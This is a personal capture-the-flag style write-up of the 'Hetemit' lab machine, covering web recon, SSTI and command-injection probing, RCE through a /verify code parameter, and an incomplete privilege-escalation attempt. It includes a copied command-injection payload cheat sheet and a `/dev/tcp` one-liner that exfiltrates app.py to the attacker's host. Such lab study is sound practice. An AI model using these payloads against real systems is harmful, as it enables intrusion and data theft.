# Hetemit Helped-Through

Name: Hetemit
Date:  19/10/2023
Difficulty: Intermediate  
Goals:  
- Web Rabbit Holage to the maximum - reflective post mortem on this machine required
Learnt:
- `curl` is the answer to me being a fool with `POST` and `Content-Type`, why have moved from `curl`ing more things.
- I need to exploit more APIs ASAP
- GROUP PERMISSIONS!
	- SCREENSHOT NICE PEASS FINDS
- I am trying harder, but the list of Rabbit Holes is immense on Proving Ground machines
- Note taking style changes required
Beyond Root:
- Webp 2023 maddness
- Reflective post mortem rabbit holage

- [[Hetemit-Notes.md]]
- [[Hetemit-CMD-by-CMDs.md]]

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

FTP is just a blackhole timeout sadness no anonymous login tears.
![](ftprabbithole1.png)

Not SambaCry which affect 4.5.9 and before
![](cme-hetemithostname.png)

Decoding the cookie
![](cookieno.png)

The cookie must be IP derived as it is the same
![](thecookiemustbeipdrived.png)

As it is used in both 50000 and 18000
![](5000cookietest.png)

#### 18000

The ven-diagram on of just nope - staff and public account non-separation in authentication and back-end management
![](protomba.png)

Uploading a picture may be a file upload vuln.
![](webpjustcameout.png)

Trying to probe at the API presuming that we need to exploit it somehow to get to the registered users or get an invite to register or other API vulnerabilities. I started learning about APIs again and actually trying to hack more realistic ones like Helped-Through: [[Awkward-Helped-Through]]. I watched some Insider PHD and re-read my note on OWASP API vulnerabilities to try to understand where and what to look for.
![](alltheroutes.png)

Breaking the cookie we get the information disclosure of you welcome to hacking Ruby on Rails 
![](breakingcookieerror.png)

It would be really cool to do the recent webp vulnerability, which made the beyond root
![](webp.png)

I just need an invite code
![](invitecodeerror.png)

There is a MD5 generation for the cookie.
![](javascript.png)

Either this is going to be a go learn Javascript idiot and a why is VS code and Snyk not working please work reading obscated Javascript is not a painless experience.

I decide when returned for the third pass over the box to test this form for various vulnerabilities
![](noinvitecode.png)

cmeeks is leaked a a username
![](nosqlierror.png)

#### 50000

![](50000.png)

Why would anything generate this: 
![](generate.png)

POST-ing to shred you say returned my hope of enumerating users to shred today. Also the hetemit cookie
![](posttoshreedsyousay.png)

Verify CODE! Sounds nice 
![](verify.png)

This is same cookie as for 18000
![](cookiesarelinked.png)

Decide to fuzz a parameter in the background with `ffuf`, which when comparing burp indicates to me that this is probably a rabbit hole as there are lots of same response from burp with `code` and for most responses from `ffuf`. I ran regardless for 6453 attempts and filtering the word just in case the response would be a more than one word long.
![](comparingburptoffuf.png)

And the result was nil.
![](49secondstodoublecheck.png)
## Exploit

Without actually press the hint button we are already hinted by looking
![](theisrce.png)

There is no console and no `verify?console=true` 
![](noconsole.png)

Ruby version
![](versionofruby.png)

Because I have looked for hours on find the exact ruby version, but do not want to metasploit this just yet. 
![](doubletappotential.png)
Realised the the potential Rabbit Hole of configuring a `Rbenv` virtual environment VM system administration to make [mpgn Ruby exploit work](https://github.com/mpgn/Rails-doubletap-RCE/blob/master/README.md). I decided to fling the RCE at the Rails application from Metasploit as last ditch attempt before I decide I must not have found something or try hard enough in some area. I did learn that we could enumerate the Ruby version through rake if we had some kind of CMDi

Enumerate the Ruby Version from [Conor Livingston](https://stackoverflow.com/questions/12979343/how-to-find-out-which-rails-version-an-existing-rails-application-is-built-on)
```bash 
rake about
```

#### Hint 1 used for RCE

WerkZeug!

*Focus on the /verify endpoint. Try different inputs in the code parameter.*

![](whatoptions.png)

Saw `{}` and its Python so possible SSTI first

It is not PHP Smarty so no SSTI
```python
${7*7}
#{7*7}
# It accept the above so
a{*comment*}b
```

[HackTricks test for Code execution](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/python)
```python
"+str(True)+"
```

Tried CMDi
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2ยบ if 1ยบ finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2ยบ
ls %0A id # %0A Execute both (RECOMMENDED)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```

Tried sending JSON as maybe there is a connect with the other web servers using the same cookie, but we also cannot POST anything
![](jsonmaybeno.png)

We also do not need the cookie to return the `{'code'}` 
![](wealsodonotneedthecookie.png)

Example attempts include:

SSTI
![](7times7.png)

Fuzzing for CMDi
![](triedfuzzingforcmdi.png)

## Helped-Through Convention

Its been 6 hours of this machine and I need to finish this and figure what I am missing. Converting this to a Helped-Through.

![](heynow.png)

I did actually try this:
*POST-ing to shred you say returned my hope of enumerating users to shred today. Also the hetemit cookie
![](posttoshreedsyousay.png)

Double checked just in case I am the bigger idiot in this
![](doublecheck.png)

And without the cookie
![](withoutthecookie.png)

Well thank you Offsec for now elevating my paranoia over whether burpsuite works. Lesson `curl` everything. Ippsec and BurpSuite are great, but this is nuts. Science is the answer!
![](proxyingtoburptocomparerequests.png)
My POST request did not have a Content-Type. `Content-Type: application/x-www-form-urlencoded`. That is such a silly mistake.

`admin@toshredsyousay.com : 42432f040c83e46478debf2cdf32cb0513c112166a7d6afac04274743620e70c`
![](whydoesthiswork.png)

Similarly we can POST and once again `curl` is the answer
![](andtheRCEbegins.png)

The write up goes on to just USE SOCAT like you are suppose to know it is on the box, which is weird. Tried enumeratinmg with `os.system('which socat')`, but the this is blind vulnerability so `ping` ourselves 
![](weirdwu.png)

## Foothold & PrivEsc

From this point I closed the write-up, firstly ensurely I was choosing a good port, sh instead of bash because CentOS and Offsec insistence it seems on their boxes that Iptables for all non used ports by the machine. This struck me as weird as would there be symmetry in the real world? It is so  weird that I can just exfil app.py with 
`bash -c "cat app.py > /dev/tcp/192.168.45.174/50000"`, but not to 6969

![](sharingwithroot.png)

Inspecting the weird `/sbin/*`
![](thesearejustsymlinktosystemctl.png)

Trying to see if we can GTFObin with sudo systemctl, but we do not have control of the SYSTEM_EDITOR
![](failedsudoweirdness.png)

`cat /usr/local/bin/cheroot` for replace all `-script.py` or `exe` I check phind to check I understnad the regex `-script.pyw` and also match on that to replace with `''`. Its owned by root and executable
```python
#!/usr/bin/python3.6

# -*- coding: utf-8 -*-
import re
import sys

from cheroot.cli import main

if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

Weirded out by `sssd` Its just the [SSSD - System Security Services Daemon - sssd.io](https://sssd.io/)
![](sssdagain.png)

If we can actual reboot we maybe able to set boot flag with Grub which would be awesome.

Rebooting the machine lol, but [/usr/sbin/grub2-set-bootflag will probably just corrupt the env variables for grub](https://bugzilla.redhat.com/show_bug.cgi?id=1764925). We can still reboot, which is interesting

I am now pushing an addition 2 hours. I wen bakc to the writeup and another silly error this time not reading the group for 
`/etc/systemd/system/pythonapp.service` which is writable. We can:

I was happy that I got some of the pieces, annoyed that I did not spot that file as writable and learnt the rabbit holage of doom that is some of these Proving Ground Practice machine.

#### Is CVE-2022-30123 a way? - TIL = No another rabbit hole

[Most minimal PacketStorm article I have ever seen](https://packetstormsecurity.com/files/cve/CVE-2022-30123), [Snyk](https://security.snyk.io/vuln/SNYK-RUBY-RACK-2848599)  says its 9.8. The web app are running a cmeeks. There is no inject point.
